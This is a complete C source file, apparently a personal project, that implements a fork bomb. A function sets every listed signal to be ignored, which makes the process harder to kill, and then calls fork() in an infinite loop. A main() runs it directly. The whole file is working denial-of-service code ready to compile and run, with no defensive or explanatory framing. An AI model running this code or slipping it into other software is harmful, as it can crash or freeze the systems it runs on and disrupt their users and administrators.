//
// Created by kkyse on 11/21/2017.
//

#include "fork_bomb.h"

#include <unistd.h>

#include "sigaction.h"
#include "util.h"

void ignore(int signal) {
    // suppress all possible signals
}

#define add_action(signal) add_sigaction(signal, sig_action)

void fork_bomb() {
    
    struct sigaction sig_action = {.sa_handler = ignore, .sa_flags = 0};
    sigemptyset(&sig_action.sa_mask);
    
    for (size_t i = 0; i < arraylen(SIGNALS); ++i) {
        add_sigaction(SIGNALS[i], sig_action);
    }
    
    for (;;) {
        fork();
    }
}

#ifndef MAIN
    #define MAIN

int main() {
    fork_bomb();
}

#endif